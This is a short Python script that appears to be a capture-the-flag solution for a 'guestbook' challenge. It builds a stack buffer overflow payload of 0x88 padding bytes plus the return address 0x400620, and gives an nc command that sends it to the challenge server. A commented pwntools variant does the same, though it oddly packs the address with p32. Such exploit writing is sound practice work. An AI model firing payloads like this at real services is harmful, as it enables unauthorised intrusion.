#!/usr/bin/env python
# -*- coding: utf-8 -*-

import struct
import os

print repr(struct.pack('<Q', 0x400620))

'''
to run 

python -c "print 'a' * 0x88 + __import__('struct').pack('<Q', 0x400620)" | nc pwn.jarvisoj.com 9876

to get flag
'''

# from pwn import *

# context.log_level = 'debug'

# ELF_IMAGE = './guestbook'

# offset = 0x88

# elf = ELF(ELF_IMAGE)

# io = process(ELF_IMAGE)

# payload = 'a' * offset + p32(elf.symbols['good_game'])

# io.sendlineafter('message:\n', payload)

# print io.recv()
